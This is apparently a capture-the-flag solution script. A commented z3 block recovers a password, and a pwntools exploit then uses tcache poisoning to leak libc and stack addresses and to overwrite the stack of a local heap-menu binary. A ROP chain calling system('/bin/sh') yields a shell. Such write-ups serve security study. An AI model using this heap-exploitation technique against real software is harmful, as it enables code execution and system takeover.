# from z3 import *

# a = Int('a')
# b = Int('b')
# c = Int('c')
# d = Int('d')
# e = Int('e')
# f = Int('f')
# g = Int('g')
# h = Int('h')
# i = Int('i')
# j = Int('j')
# k = Int('k')
# l = Int('l')
# m = Int('m')
# n = Int('n')
# o = Int('o')
# p = Int('p')

# solve(
#   a * 0x4E04 + b * 0x0B690 == 24827281 ^ 0x125E591,
#   b * 0x34E + c * 0x3343 == 0x13D6DB3 ^ 0x125E591,
#   c * 0x4A41 + d * 0x8A4A == 0x17A2123 ^ 0x125E591,
#   d *0x0A804 + e * 0x5990 == 0x141B52D ^ 0x125E591,
#   e * 0x58EB + f * 0x581C == 0x11B38C0 ^ 0x125E591,
#   f * 0x2329 + g * 0x3366 == 0x13D0476 ^ 0x125E591,
#   g * 0x9D9 + h * 0x0C1F0 == 0x1700A51 ^ 0x125E591,
#   h * 0x0A5D4 + i * 0x0B390 == 0x14C747D ^ 0x125E591,
#   i * 0x0D515 + j * 0x6602 == 0x171CB5F ^ 0x125E591,
#   j * 0x0A549 + k * 0x0CE75 == 0x14B8506 ^ 0x125E591,
#   k * 0x0F63F + l * 0x1504 == 0x112AD1D ^ 0x125E591,
#   l * 0x20AF + m * 0x6FF3 == 0x106CCE0 ^ 0x125E591,
#   m * 0x909 + n * 0x829D == 0x137627C ^ 0x125E591,
#   n * 0x0EF4A + o * 0x0EC6A == 0x118B7A5 ^ 0x125E591,
#   o * 0x0A157 + p * 0x925A == 0x1024C40 ^ 0x125E591,
#   p == 0x125E5B0 ^ 0x125E591
# )


# tmp = [33, 33, 33, 48, 111, 48, 111, 48, 111, 48, 111, 71, 115, 116, 101, 76][::-1]

# password = ''
# for i in tmp:
#   password += chr(i)

# print(password)


#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./pwn')

def add(size):
  p.sendlineafter('Your choice :', str(1))
  p.sendlineafter('size:', str(size))

def edit(idx, payload):
  p.sendlineafter('Your choice :', str(2))
  p.sendlineafter('idx:', str(idx))
  p.sendafter('ctx', payload)

def delete(idx):
  p.sendlineafter('Your choice :', str(3))
  p.sendlineafter('idx:', str(idx))

def show(idx):
  p.sendlineafter('Your choice :', str(4))
  p.sendlineafter('idx:', str(idx))
 
if __name__ == "__main__":
  p.sendlineafter('input your password!', 'LetsGo0o0o0o0!!!')
  add(0x500)  #0
  add(0x30)   #1
  add(0x30)   #2

  delete(0)
  add(0x30)   #3
  edit(3, 'a' * 8)
  show(3)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x1ec010
  success('LIBC: ' + str(hex(libc)))

  __malloc_hook = 0x00000000001ebb70 + libc
  __free_hook = 0x00000000001eeb28 + libc
  system = 0x0000000000055410 + libc
  environ = 0x00000000001ef2e0 + libc
  str_bin_sh = 0x1b75aa + libc
  pop_rdi = 0x0000000000026b72 + libc
  ret = 0x25679 + libc
  
  delete(1)
  delete(2)
  payload = p64(environ) + p64(0)
  add(0x30)   #4 == 2
  delete(2)
  edit(4, payload)
  add(0x30)   #5
  add(0x30)   #6
  show(6)
  stack = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x170
  success('STACK: ' + str(hex(stack)))

  add(0x40) #7
  add(0x40) #8
  delete(7)
  delete(8)
  payload = p64(stack)
  add(0x40) #9 == 8
  delete(8)
  edit(9, payload)
  add(0x40) #10
  add(0x40) #11
  payload = p64(ret) + p64(pop_rdi) + p64(str_bin_sh) + p64(system)
  edit(11, payload)
  gdb.attach(p)
  p.interactive()